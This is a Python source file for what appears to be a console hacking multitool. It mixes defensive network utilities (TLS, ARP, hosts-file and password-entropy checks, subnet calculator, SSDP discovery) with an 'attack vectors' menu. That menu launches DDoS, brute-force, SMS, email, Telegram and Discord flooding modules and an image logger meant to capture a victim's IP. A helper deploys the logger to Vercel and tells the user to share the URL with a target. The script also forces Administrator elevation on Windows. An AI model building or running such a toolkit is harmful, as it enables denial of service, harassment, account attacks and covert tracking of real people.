        print(f"  ➔ Active Cipher Suite: {Colors.CYAN}{negotiated_cipher[0]}{Colors.RESET} ({negotiated_cipher[1]} Protocol Build)")
        
        if peer_certificate:
            from datetime import datetime, timezone
            expiration_string = peer_certificate.get('notAfter')
            if expiration_string:
                try:
                    expiry_date = datetime.strptime(expiration_string, '%b %d %H:%M:%S %Y %Z')
                    remaining_days = (expiry_date - datetime.now(timezone.utc).replace(tzinfo=None)).days
                    status_color = Colors.GREEN if remaining_days > 30 else Colors.RED
                    print(f"  ➔ Expiration Limit  : {expiration_string} ({status_color}{remaining_days} Days Remaining{Colors.RESET})")
                except Exception:
                    print(f"  ➔ Expiration Limit  : {expiration_string}")
                    
            subject_dict = dict(x[0] for x in peer_certificate.get('subject', []))
            print(f"  ➔ Certificate Owner : {subject_dict.get('commonName', 'N/A')}")
            issuer_dict = dict(x[0] for x in peer_certificate.get('issuer', []))
            print(f"  ➔ Cert Authority    : {issuer_dict.get('organizationName', 'N/A')}")
    except Exception as tls_err:
        print(f"\n{Colors.RED}[!] Secure Telemetry Handshake Terminated: Connection failure: {tls_err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_connection_profiler():
    """Queries kernel network tables via native system utilities to display listening connection descriptors."""
    print(f"\n{Colors.GREEN}[MODULE 03 // HOST ACTIVE NETWORK CONNECTION & LISTENING PORT PROFILER]{Colors.RESET}")
    
    is_windows = sys.platform.startswith('win')
    cmd_arguments = ['netstat', '-ano'] if is_windows else ['ss', '-tuln']
    
    print(f"\n{Colors.GREEN}Executing native administrative subprocess network layer queries...{Colors.RESET}\n")
    print("-" * 75)
    
    try:
        subprocess_result = subprocess.run(cmd_arguments, capture_output=True, text=True, errors='ignore')
        output_rows = subprocess_result.stdout.splitlines()
        
        for row in output_rows[:45]:
            print(row)
        if len(output_rows) > 45:
            print(f"\n{Colors.AMBER}[...] Output truncated. Total connection descriptors log count: {len(output_rows)} lines.{Colors.RESET}")
    except Exception as exec_err:
        print(f"{Colors.RED}[!] Subprocess execution dropped: Target utility failed: {exec_err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_password_auditor():
    """Performs localized Shannon information-entropy metric calculations to check credential complexity parameters completely offline."""
    print(f"\n{Colors.GREEN}[MODULE 04 // PASSWORD COMPLEXITY & OFFLINE INFORMATION ENTROPY SCANNERS]{Colors.RESET}")
    target_pwd = input("\nEnter credential string value to audit: ").strip()
    if not target_pwd:
        return
        
    string_length = len(target_pwd)
    has_upper = any(c.isupper() for c in target_pwd)
    has_lower = any(c.islower() for c in target_pwd)
    has_digit = any(c.isdigit() for c in target_pwd)
    has_special = any(not c.isalnum() for c in target_pwd)
    
    character_pool = 0
    if has_lower: character_pool += 26
    if has_upper: character_pool += 26
    if has_digit: character_pool += 10
    if has_special: character_pool += 32
    
    calculated_entropy = 0.0
    if character_pool > 0:
        calculated_entropy = math.log2(character_pool) * string_length
        
    print(f"\n{Colors.BOLD}INFORMATION THEORY AUDIT PARAMETERS:{Colors.RESET}")
    print("-" * 75)
    print(f"  ➔ Character Length Metric: {string_length} glyph elements")
    print(f"  ➔ Flag Allocations Array : Upper={has_upper}, Lower={has_lower}, Num={has_digit}, Symbol={has_special}")
    print(f"  ➔ Alphabet Complexity Pool: {character_pool} unique configuration variants")
    print(f"  ➔ Evaluated Entropy Rank  : {calculated_entropy:.4f} bits of information space density")
    print("-" * 75)
    
    if calculated_entropy < 40.0:
        print(f"  Analysis Verdict : {Colors.RED}[!!!] WEAK STRUCTURE // PASS PHRASE COMPROMISE RISK{Colors.RESET}")
    elif calculated_entropy < 70.0:
        print(f"  Analysis Verdict : {Colors.AMBER}[!] REGULAR PROFILE // STRENGTHENING RECOMMENDED{Colors.RESET}")
    else:
        print(f"  Analysis Verdict : {Colors.GREEN}[✓] HIGH DENSITY RUGGED BASELINE STABLE PROFILE{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_arp_profiler():
    """
    Parses active local network parameter neighbors natively.
    Flags duplicate physical configurations mapping anomalies over network lines.
    """
    print(f"\n{Colors.GREEN}[MODULE 05 // LOCAL NETWORK ARP TABLE CACHE PROFILER & DUPLICATE MAC AUDITOR]{Colors.RESET}")
    time.sleep(0.5)

    is_windows = sys.platform.startswith('win')
    cmd_arguments = ['arp', '-a']
    
    print(f"\n{Colors.GREEN}Invoking administrative hardware resolution cache tables...{Colors.RESET}\n")
    print(f"{Colors.BOLD}{'LOCAL IP COMPONENT':<24}{'PHYSICAL HARDWARE ADDRESS (MAC)':<26}{'ALLOCATION STATE'}{Colors.RESET}")
    print("-" * 75)

    try:
        process_result = subprocess.run(cmd_arguments, capture_output=True, text=True, errors='ignore')
        output_lines = process_result.stdout.splitlines()
        
        mac_registry = {}
        arp_entries_found = 0

        ip_pattern = re.compile(r'(?:[0-9]{1,3}\.){3}[0-9]{1,3}')
        mac_pattern = re.compile(r'(?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}')

        for line in output_lines:
            found_ip = ip_pattern.search(line)
            found_mac = mac_pattern.search(line)
            
            if found_ip and found_mac:
                arp_entries_found += 1
                ip_str = found_ip.group(0)
                mac_str = found_mac.group(0).lower().replace('-', ':')
                
                allocation_type = "STATIC" if "static" in line.lower() else "DYNAMIC"
                
                print(f"  {ip_str:<22}{mac_str:<26}{allocation_type}")
                
                if mac_str not in mac_registry:
                    mac_registry[mac_str] = []
                mac_registry[mac_str].append(ip_str)

        print("-" * 75)
        print(f"[✓] Active hardware address caches analyzed: {arp_entries_found} network bindings mapped.")
        
        anomalies_detected = 0
        for mac, ip_list in mac_registry.items():
            if len(ip_list) > 1 and mac != "ff:ff:ff:ff:ff:ff" and not mac.startswith("224.") and not mac.startswith("239."):
                anomalies_detected += 1
                print(f"\n{Colors.RED}[!] WARNING // DUPLICATE HARDWARE MAPPING DETECTED{Colors.RESET}")
                print(f"  Physical Hardware ID: {Colors.AMBER}{mac}{Colors.RESET}")
                print(f"  Conflicting IP Nodes: {Colors.CYAN}{', '.join(ip_list)}{Colors.RESET}")

        if anomalies_detected == 0:
            print(f"{Colors.GREEN}[✓] Layer 2 Security Status Baseline: Clean. No physical node overlap caught.{Colors.RESET}")

    except Exception as err:
        print(f"{Colors.RED}[!] Subprocess lookup execution error tracking table allocations: {err}{Colors.RESET}")

    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_cidr_calculator():
    """Parses an IPv4 CIDR string offline to extract subnet masks, host ranges, and boundary thresholds mathematically."""
    print(f"\n{Colors.GREEN}[MODULE 06 // CIDR SUBNET IPV4 NETWORK RANGE & MASK CALCULATOR]{Colors.RESET}")
    cidr_input = input("\nEnter target IPv4 CIDR address block (e.g., 192.168.1.0/24): ").strip()
    if not cidr_input or "/" not in cidr_input:
        print(f"{Colors.RED}[!] Format Check Error: String must follow standard CIDR prefix conventions.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    ip_part, prefix_str = cidr_input.split("/")
    try:
        prefix = int(prefix_str)
        if prefix < 0 or prefix > 32:
            raise ValueError()
    except ValueError:
        print(f"{Colors.RED}[!] Mask Validation Error: CIDR prefix mask value must rest between 0 and 32.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    try:
        ip_octets = [int(o) for o in ip_part.split(".")]
        if len(ip_octets) != 4 or any(o < 0 or o > 255 for o in ip_octets):
            raise ValueError()
    except ValueError:
        print(f"{Colors.RED}[!] Address Exception: Provided string component fails dotted-quad validation rules.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    # Translate configurations into raw bit arrays to handle mathematical masks manipulations
    raw_ip_bits = (ip_octets[0] << 24) + (ip_octets[1] << 16) + (ip_octets[2] << 8) + ip_octets[3]
    raw_mask_bits = (0xFFFFFFFF >> (32 - prefix)) << (32 - prefix) if prefix > 0 else 0
    raw_wildcard_bits = ~raw_mask_bits & 0xFFFFFFFF
    
    raw_network_bits = raw_ip_bits & raw_mask_bits
    raw_broadcast_bits = raw_network_bits | raw_wildcard_bits
    
    def bits_to_quad_string(bits):
        return f"{(bits >> 24) & 0xFF}.{(bits >> 16) & 0xFF}.{(bits >> 8) & 0xFF}.{bits & 0xFF}"
        
    total_hosts = 2**(32 - prefix)
    assignable_hosts = total_hosts - 2 if prefix < 31 else 0
    
    print(f"\n{Colors.GREEN}[✓] INTERFACE CIDR METRIC CONFIGURATIONS ARCHIVE{Colors.RESET}")
    print("-" * 75)
    print(f"  ➔ Provided Block Target : {Colors.CYAN}{cidr_input}{Colors.RESET}")
    print(f"  ➔ Subnet Mask Dotted    : {bits_to_quad_string(raw_mask_bits)}")
    print(f"  ➔ Inverse Wildcard Mask : {bits_to_quad_string(raw_wildcard_bits)}")
    print(f"  ➔ Network Address Layer : {Colors.AMBER}{bits_to_quad_string(raw_network_bits)}{Colors.RESET}")
    print(f"  ➔ Broadcast Address Node: {Colors.AMBER}{bits_to_quad_string(raw_broadcast_bits)}{Colors.RESET}")
    if prefix < 31:
        print(f"  ➔ Usable IP Host Range  : {bits_to_quad_string(raw_network_bits + 1)} - {bits_to_quad_string(raw_broadcast_bits - 1)}")
    else:
        print("  ➔ Usable IP Host Range  : N/A (Point-to-Point / Loopback Allocation Segment)")
    print(f"  ➔ Usable Endpoint Count : {Colors.GREEN}{assignable_hosts}{Colors.RESET} active assignable addresses ({total_hosts} total bits block)")
    
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_upnp_discovery():
    """Broadcasts SSDP discovery packets natively over UDP multicast to map exposed smart devices or open router maps."""
    print(f"\n{Colors.GREEN}[MODULE 07 // UPnP SSDP LOCAL LAN SMART DEVICE DISCOVERY EXPLORER]{Colors.RESET}")
    print("Sends an unauthenticated UDP multicast discover frame to identify hidden endpoints and UPnP mappings.")
    if input("Initialize local network UPnP multicast sweep? (Y/N): ").strip().upper() != 'Y':
        return
        
    print(f"\n{Colors.GREEN}Broadcasting custom SSDP request payload to multicast group 239.255.255.250:1900...{Colors.RESET}\n")
    ssdp_request_payload = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 2\r\n"
        "ST: ssdp:all\r\n\r\n"
    ).encode('utf-8')
    
    try:
        # Bind unmanaged UDP datagram connection socket frames natively
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        udp_socket.settimeout(2.5)
        udp_socket.sendto(ssdp_request_payload, ("239.255.255.250", 1900))
        
        uncovered_appliances = set()
        while True:
            try:
                packet_data, remote_address = udp_socket.recvfrom(4096)
                device_ip = remote_address[0]
                if device_ip not in uncovered_appliances:
                    uncovered_appliances.add(device_ip)
                    print(f"  {Colors.GREEN}[✓] RESPONSIVE APPLIANCE DISCOVERED{Colors.RESET} Node Location IP: {Colors.CYAN}{device_ip}{Colors.RESET}")
            except socket.timeout:
                break
        udp_socket.close()
        print(f"\nSubnet sweep finalized. Total unique discoverable UPnP nodes tracked: {Colors.GREEN}{len(uncovered_appliances)}{Colors.RESET}")
    except Exception as socket_err:
        print(f"{Colors.RED}[!] Failed to open local network UDP multicast sockets framework: {socket_err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nSweep complete. Press Enter to pull up sub-directory options...")

def run_dns_spoof_auditor():
    """Parses platform-native static resolution system configuration files to flag hidden static redirections."""
    print(f"\n{Colors.GREEN}[MODULE 08 // LOCAL HOSTS FILE DNS SPOOFING & CACHE POISONING AUDITOR]{Colors.RESET}")
    print("Parses local static configuration tables to flag hidden IP redirections overriding nameservers.")
    
    target_hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if os.name == "nt" else "/etc/hosts"
    print(f"Target system configuration lookup location: {Colors.CYAN}{target_hosts_path}{Colors.RESET}\n")
    
    if not os.path.exists(target_hosts_path):
        print(f"{Colors.RED}[!] File Audit Error: Static lookup configuration path unresolvable on this build.{Colors.RESET}")
        input(f"\nPress Enter to return...")
        return
        
    try:
        active_redirection_entries = 0
        with open(target_hosts_path, 'r', encoding='utf-8', errors='ignore') as hosts_file:
            for text_line_num, line_string in enumerate(hosts_file, 1):
                sanitized_row = line_string.strip()
                if sanitized_row and not sanitized_row.startswith("#"):
                    active_redirection_entries += 1
                    print(f"  {Colors.AMBER}[STATIC EXPOSURE OVERRIDE FOUND]{Colors.RESET} Line {text_line_num}: {Colors.CYAN}{sanitized_row}{Colors.RESET}")
                    
        print("-" * 75)
        if active_redirection_entries == 0:
            print(f"{Colors.GREEN}[✓] Static redirection database baseline is nominal and clear.{Colors.RESET}")
            print("    No override mappings detected overriding default DNS resolution records.")
        else:
            print(f"\n{Colors.AMBER}[!] Review target lines above to ensure entries are authorized.{Colors.RESET}")
            print("    Custom static parameters override systemic DNS nameserver queries entirely.")
    except Exception as unmanaged_io_err:
        print(f"{Colors.RED}[!] Failed to acquire unmanaged read handles against system infrastructure file: {unmanaged_io_err}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nAudit completed. Press Enter to load sub-directory options...")

def run_mac_vendor_lookup():
    """Extracts Organizationally Unique Identifier (OUI) prefixes to resolve physical asset manufacturers."""
    print(f"\n{Colors.GREEN}[MODULE 09 // MAC ADDRESS OUI VENDOR DIRECTORY LOOKUP ENGINE]{Colors.RESET}")
    input_mac = input("\nEnter hardware MAC address to profile (e.g., 3C:5A:B4:FF:11:22): ").strip().upper()
    if not input_mac:
        return
        
    purified_mac = re.sub(r'[^0-9A-F]', '', input_mac)
    if len(purified_mac) < 6:
        print(f"{Colors.RED}[!] Format Validation Error: Incomplete physical identifier payload layout.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    oui_prefix = purified_mac[:6]
    formatted_oui = f"{oui_prefix[0:2]}:{oui_prefix[2:4]}:{oui_prefix[4:6]}"
    
    # High-volume offline fallback signature matrix directory mapping common vendor allocations
    offline_oui_cache = {
        "00:05:69": "VMware, Inc.",
        "00:0C:29": "VMware, Inc.",
        "00:1C:42": "Parallels, Inc.",
        "00:50:56": "VMware, Inc.",
        "3C:5A:B4": "Google, LLC",
        "00:16:3E": "Xen Project / Red Hat",
        "52:54:00": "QEMU Virtual NIC",
        "00:17:FA": "Apple, Inc.",
        "00:1E:C2": "Apple, Inc.",
        "A4:77:33": "Apple, Inc.",
        "00:1A:11": "Google, LLC",
        "D8:3A:DD": "GIGA-BYTE Technology Co., Ltd.",
        "E4:54:E8": "Dell Inc.",
        "00:14:22": "Dell Inc.",
        "00:25:90": "Super Micro Computer, Inc.",
        "00:15:5D": "Microsoft Corporation (Hyper-V)"
    }
    
    print(f"\n{Colors.GREEN}Analyzing physical allocation signatures for OUI prefix: {formatted_oui}...{Colors.RESET}")
    print("-" * 75)
    
    resolved_vendor = offline_oui_cache.get(formatted_oui)
    if resolved_vendor:
        print(f"  ➔ Hardware OUI Prefix: {formatted_oui}")
        print(f"  ➔ Resolved Core Base : {Colors.GREEN}{resolved_vendor}{Colors.RESET}")
        print(f"  ➔ Resolution Layer   : Local Static Cache Index Registry (Offline Success)")
    else:
        print(f"{Colors.CYAN}Prefix absent from offline cache matrix. Dispatching API request to macvendors.com...{Colors.RESET}")
        url = f"https://api.macvendors.com/{formatted_oui}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
        try:
            with urllib.request.urlopen(req, timeout=8) as response:
                api_vendor = response.read().decode('utf-8').strip()
                print(f"\n  ➔ Hardware OUI Prefix: {formatted_oui}")
                print(f"  ➔ Resolved Core Base : {Colors.GREEN}{api_vendor}{Colors.RESET}")
                print(f"  ➔ Resolution Layer   : Real-Time Distributed API Registry (Online Success)")
        except urllib.error.HTTPError as err:
            if err.code == 404:
                print(f"\n{Colors.RED}[!] OUI Registry Unresolved: Prefix is absent from verified international indices.{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}[!] Database service dropped query: HTTP status validation error {err.code}{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[!] Streaming link connection timeout: Defaulting to unknown manufacturer state: {e}{Colors.RESET}")
            
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

# ================================================================================
# CENTRAL SUBSYSTEM SHELL MATRIX ORCHESTRATION LOOP
# ================================================================================

def main():
    """
    Main runtime entry point. Natively checks for administrative credentials
    on Windows environments and enforces self-contained UAC auto-elevation triggers.
    """
    if sys.platform.startswith('win'):
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] Mainframe Core: Elevating operating privileges to Administrator...")
                time.sleep(1)
                # Re-invoke python executable context using shell UAC elevation triggers
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except Exception as elevation_error:
            print(f"Windows privilege monitor initialization error: {elevation_error}")
            time.sleep(2)

    # Initialize the cross-platform background window title matrix scrambler daemon thread
    try:
        scrambler_thread = threading.Thread(target=title_scrambler_daemon, daemon=True)
        scrambler_thread.start()
    except Exception as scrambler_err:
        print(f"[!] Warning: Title matrix custom visual layer bypassed: {scrambler_err}")

    # Engaged Session Logging Infrastructure
    try:
        log_directory = "logs"
        os.makedirs(log_directory, exist_ok=True)
        session_timestamp = time.strftime("%Y%m%d_%H%M%S")
        log_file_name = os.path.join(log_directory, f"session_{session_timestamp}.txt")
        
        # Instantiate dual stream hook to duplicate runtime terminal history to disk safely
        active_log_handle = open(log_file_name, "w", encoding="utf-8")
        sys.stdout = DualStreamWriter(sys.stdout, active_log_handle)
        print(f"[+] Automated Dual-Stream System Logging Operational Cores Engaged.")
        print(f"[+] Log Target Vector Initialized: {log_file_name}\n")
        time.sleep(1)
    except Exception as log_init_err:
        print(f"[!] Warning: Session logging buffer core initialization interrupted: {log_init_err}")
        time.sleep(1.5)

    while True:
        try:
            print(Colors.CLEAR_SCREEN)
            MainframeUI.draw_banner()
            MainframeUI.display_main_menu()
            
            selection_target = input(f"{Colors.BOLD}mainframe@operator_console:~# {Colors.RESET}").strip()
            
            if selection_target in ["1", "2", "3", "4", "5"]:
                handle_category_deck(selection_target)
            elif selection_target == "6":
                print(f"\n{Colors.RED}Disconnecting security core links. Clearing memory trace structures...{Colors.RESET}")
                time.sleep(1)
                print(f"{Colors.GREEN}Console session closed successfully. Systems baseline nominal.{Colors.RESET}\n")
                break
            else:
                print(f"\n{Colors.RED}[!] Unknown instruction parameter sequence. Resetting workspace...{Colors.RESET}")
                time.sleep(1.2)
                
        except KeyboardInterrupt:
            print(f"\n\n{Colors.GREEN}[!] Main operational workflow interrupted. Disposing active frames...{Colors.RESET}")
            break
        except Exception as internal_error:
            print(f"\n{Colors.RED}Mainframe master pipeline failure logged: {internal_error}{Colors.RESET}")
            time.sleep(2)

# ================================================================================
# CENTRAL SUBSYSTEM SHELL MATRIX ORCHESTRATION LOOP
# ================================================================================

def handle_category_deck(deck_id):
    """
    Acts as the second-tier router, isolating application submenus inside locked
    loop environments to maximize screen space and remove menu clutter.
    """
    while True:
        print(Colors.CLEAR_SCREEN)
        
        # --- ENGINE PIPELINE 01: RECON UTILITIES ---
        if deck_id == "1":
            MainframeUI.display_network_menu()
            operator_input = input(f"{Colors.BOLD}mainframe@network_cores:~# {Colors.RESET}").strip()
            
            if operator_input == "1":
                run_pinger_engine()
            elif operator_input == "2":
                run_reverse_dns()
            elif operator_input == "3":
                run_port_scanner()
            elif operator_input == "4":
                run_ping_sweeper()
            elif operator_input == "5":
                run_banner_grabber()
            elif operator_input == "6":
                run_dns_recon()
            elif operator_input == "7":
                run_subdomain_finder()
            elif operator_input == "8":
                run_rdap_lookup()
            elif operator_input == "9":
                run_http_header_auditor()
            elif operator_input == "10":
                run_doh_resolver()
            elif operator_input == "11":
                break
                
        # --- ENGINE PIPELINE 02: EXT-OSINT UTILITIES ---
        elif deck_id == "2":
            MainframeUI.display_osint_menu()
            operator_input = input(f"{Colors.BOLD}mainframe@osint_engines:~# {Colors.RESET}").strip()
            
            if operator_input == "1":
                run_sherlock_hook()
            elif operator_input == "2":
                run_phoneinfoga_hook()
            elif operator_input == "3":
                run_holehe_hook()
            elif operator_input == "4":
                run_socialscan_hook()
            elif operator_input == "5":
                run_live_breach_checker()
            elif operator_input == "6":
                run_threat_intel()
            elif operator_input == "7":
                run_ip_geolocation()
            elif operator_input == "8":
                run_homograph_analyzer()
            elif operator_input == "9":
                break
                
        # --- ENGINE PIPELINE 03: LOCAL UTILITIES & SCANS ---
        elif deck_id == "3":
            MainframeUI.display_utilities_menu()
            operator_input = input(f"{Colors.BOLD}mainframe@local_utilities:~# {Colors.RESET}").strip()
            
            if operator_input == "1":
                run_traffic_monitor()
            elif operator_input == "2":
                run_secret_scanner()
            elif operator_input == "3":
                run_hash_matrix()
            elif operator_input == "4":
                run_system_profiler()
            elif operator_input == "5":
                run_base64_matrix()
            elif operator_input == "6":
                break

        # --- ENGINE PIPELINE 04: ADVANCED COMPLIANCE AUDITS ---
        elif deck_id == "4":
            MainframeUI.display_advanced_audits_menu()
            operator_input = input(f"{Colors.BOLD}mainframe@advanced_audits:~# {Colors.RESET}").strip()
            
            if operator_input == "1":
                run_file_integrity_monitor()
            elif operator_input == "2":
                run_ssl_auditor()
            elif operator_input == "3":
                run_connection_profiler()
            elif operator_input == "4":
                run_password_auditor()
            elif operator_input == "5":
                run_arp_profiler()
            elif operator_input == "6":
                run_cidr_calculator()
            elif operator_input == "7":
                run_upnp_discovery()
            elif operator_input == "8":
                run_dns_spoof_auditor()
            elif operator_input == "9":
                run_mac_vendor_lookup()
            elif operator_input == "10":
                break

        # --- ENGINE PIPELINE 05: ATTACK VECTORS SUBMENU ---
        elif deck_id == "5":
            MainframeUI.display_attack_menu()
            operator_input = input(f"{Colors.BOLD}mainframe@attack_vectors:~# {Colors.RESET}").strip()
            
            if operator_input == "1":
                if ddos_attack is None:
                    print(f"{Colors.RED}[!] DDoS Attack module not loaded.{Colors.RESET}")
                else:
                    ddos_attack.start_ddos()
            elif operator_input == "2":
                run_image_logger()
            elif operator_input == "3":
                if bruteforce_attack is None:
                    print(f"{Colors.RED}[!] Brute Force module not loaded.{Colors.RESET}")
                else:
                    bruteforce_attack.start_bruteforce()
            elif operator_input == "4":
                if sms_attack is None:
                    print(f"{Colors.RED}[!] SMS Attack module not loaded.{Colors.RESET}")
                else:
                    sms_attack.start_sms()
            elif operator_input == "5":
                if email_attack is None:
                    print(f"{Colors.RED}[!] Email Attack module not loaded.{Colors.RESET}")
                else:
                    email_attack.email_start()
            elif operator_input == "6":
                if telegram_attack is None:
                    print(f"{Colors.RED}[!] Telegram Attack module not loaded.{Colors.RESET}")
                else:
                    telegram_attack.start_telegram()
            elif operator_input == "7":
                if discord_attack is None:
                    print(f"{Colors.RED}[!] Discord Attack module not loaded.{Colors.RESET}")
                else:
                    discord_attack.start_discord()
            elif operator_input == "8":
                break
            else:
                print(f"\n{Colors.RED}[!] Unknown instruction parameter sequence. Resetting workspace...{Colors.RESET}")
                time.sleep(1.2)
        else:
            break

def handle_attack_vectors():
    """Handles Sub-Directory 05 // Attack Vectors & Exploit Frameworks"""
    
    if not IMPORTS_OK:
        print(f"{Colors.RED}[!] Beast Bomber modules not found. Ensure they are installed in 'core' folder or adjust import paths.{Colors.RESET}")
        return
        
    if sys.platform.startswith('win'):
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("Beast Bomber 💣")
        except:
            pass
            
    logo_main()
    
    if get_lang() == "ru":
        menu_ru()
    else:
        menu_en()
        
    from colorama import Fore, Style
    
    sms_attack = SMSAttack() if SMSAttack else None
    email_attack = EmailAttack() if EmailAttack else None
    telegram_attack = TelegramAttack() if TelegramAttack else None
    discord_attack = DiscordSpam() if DiscordSpam else None
    ddos_attack = DDoSAttack() if DDoSAttack else None
    bruteforce_attack = BruteForceAttack() if BruteForceAttack else None
    
    while True:
        print(f"{Fore.MAGENTA}{'>'}{Fore.GREEN}", end="") 
        option = input("\nSelect Attack Vector (0=Exit): ").strip()

        try:
            if option == '1':
                if ddos_attack is None:
                    print(f"{Fore.RED}[!] DDoS Attack module not loaded.{Colors.RESET}")
                else:
                    print("Launching Beast Mode Core...")
                    ddos_attack.start_ddos()
                
            elif option == '2':
                print("Launching Image Logger...")
                run_image_logger()
            
            elif option == '3':
                if bruteforce_attack is None:
                    print(f"{Fore.RED}[!] Brute Force module not loaded.{Colors.RESET}")
                else:
                    print("Launching Brute Force Core...")
                    bruteforce_attack.start_bruteforce()
            
            elif option == '4':
                if sms_attack is None:
                    print(f"{Fore.RED}[!] SMS Attack module not loaded.{Colors.RESET}")
                else:
                    print("Launching SMS Stream...")
                    sms_attack.start_sms()
                
            elif option == '5':
                if email_attack is None:
                    print(f"{Fore.RED}[!] Email Attack module not loaded.{Colors.RESET}")
                else:
                    print("Launching Email Flood...")
                    email_attack.email_start()
                
            elif option == '6':
                if telegram_attack is None:
                    print(f"{Fore.RED}[!] Telegram Attack module not loaded.{Colors.RESET}")
                else:
                    print("Launching Telegram Injector...")
                    telegram_attack.start_telegram()
                
            elif option == '7':
                if discord_attack is None:
                    print(f"{Fore.RED}[!] Discord Attack module not loaded.{Colors.RESET}")
                else:
                    print("Launching Discord Spammer...")
                    discord_attack.start_discord()
                
            elif option == '8':
                break
                
            elif option.lower() == '0' or option == "exit":
                print(f"\n{Colors.RED}Disconnecting attack vector links.Clearing memory trace structures...{Colors.RESET}")
                time.sleep(1)
                break
                
            else:
                print(f"{Colors.RED}[!] Invalid option.{Colors.RESET}")
                
        except AttributeError:
             if get_lang() == "ru": 
                 print(Fore.RED + '\nМодуль не найден или требует инициализации.')
             else:
                 print(Fore.RED + f'\nModule {option} not initialized properly. Check Beast Bomber paths.')
        except Exception as e:
            error_msg = str(e)[:50]
            if get_lang() == "ru":
                print(f"\n{Fore.YELLOW}{Colors.BOLD}[!] Ошибка в модуле:{e}{Colors.RESET}")
            else:
                print(f"\n{Fore.YELLOW}{Colors.BOLD}[!] Error in module:{e}{Colors.RESET}")

        finally:
            time.sleep(1.5) 

def run_image_logger():
    """Starts an instant image logger that captures victim IP when they open the image."""
    print(f"\n{Colors.CYAN}[INSTANT IMAGE LOGGER]{Colors.RESET}")
    print(f"{Colors.GREEN}Select deployment method:{Colors.RESET}")
    print(f"  [{Colors.AMBER}1{Colors.RESET}] Local Server (http://localhost:8080)")
    print(f"  [{Colors.AMBER}2{Colors.RESET}] Deploy to Vercel (Public URL)")
    print(f"  [{Colors.AMBER}3{Colors.RESET}] Return to Menu")
    
    choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Select: ").strip()
    
    if choice == '1':
        print(f"\n{Colors.GREEN}Starting local image logger server...{Colors.RESET}")
        try:
            from core.image_logger.imagelogger import ImageLogger
            logger = ImageLogger(port=8080)
            logger.start_and_monitor()
        except ImportError:
            print(f"{Colors.RED}[!] Image Logger module not found.{Colors.RESET}")
            time.sleep(2)
        except Exception as e:
            print(f"{Colors.RED}[!] Image Logger error: {e}{Colors.RESET}")
            time.sleep(2)
    elif choice == '2':
        deploy_vercel_logger()
    elif choice == '3':
        return
    else:
        print(f"{Colors.RED}[!] Invalid option.{Colors.RESET}")
        time.sleep(1)

def deploy_vercel_logger():
    """Deploys the image logger to Vercel for a public URL."""
    print(f"\n{Colors.CYAN}[VERCEL IMAGE LOGGER DEPLOYMENT]{Colors.RESET}")
    print(f"{Colors.GREEN}Preparing Vercel deployment...{Colors.RESET}")
    
    vercel_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vercel-image-logger')
    
    if not os.path.exists(vercel_dir):
        print(f"{Colors.RED}[!] Vercel deployment folder not found at: {vercel_dir}{Colors.RESET}")
        time.sleep(2)
        return
    
    print(f"{Colors.GREEN}Vercel project ready at: {vercel_dir}{Colors.RESET}")
    print(f"{Colors.AMBER}To deploy:{Colors.RESET}")
    print(f"  1. Install Vercel CLI: {Colors.CYAN}npm i -g vercel{Colors.RESET}")
    print(f"  2. Navigate to: {Colors.CYAN}{vercel_dir}{Colors.RESET}")
    print(f"  3. Run: {Colors.CYAN}vercel --prod{Colors.RESET}")
    print(f"  4. Share the public URL with your target{Colors.RESET}")
    
    deploy_now = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Attempt auto-deploy now? (y/n): ").strip().lower()
    
    if deploy_now == 'y':
        try:
            import subprocess
            original_dir = os.getcwd()
            os.chdir(vercel_dir)
            
            vercel_cmd = None
            candidates = [
                os.path.join(os.environ.get('APPDATA', ''), 'npm', 'vercel.cmd'),
                os.path.join(os.environ.get('APPDATA', ''), 'npm', 'vercel'),
                'vercel',
            ]
            for candidate in candidates:
                if os.path.exists(candidate):
                    vercel_cmd = candidate
                    break
            
            if not vercel_cmd:
                print(f"{Colors.RED}[!] Vercel CLI not found. Install with: npm i -g vercel{Colors.RESET}")
                input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
                return
            
            print(f"{Colors.GREEN}Running vercel --prod...{Colors.RESET}")
            env = os.environ.copy()
            npm_dir = os.path.join(os.environ.get('APPDATA', ''), 'npm')
            node_dir = r'C:\Program Files\nodejs'
            env['PATH'] = node_dir + os.pathsep + npm_dir + os.pathsep + env.get('PATH', '')
            
            result = subprocess.run(
                ['cmd', '/c', vercel_cmd, '--prod', '-y'],
                capture_output=True,
                text=True,
                timeout=120,
                env=env
            )
            
            os.chdir(original_dir)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}Deployment successful!{Colors.RESET}")
                
                alias_match = re.search(r'Aliased\s+(https?://[^\s]+\.vercel\.app)', result.stdout + result.stderr)
                url_match = re.search(r'https?://[^\s]+\.vercel\.app', result.stdout + result.stderr)
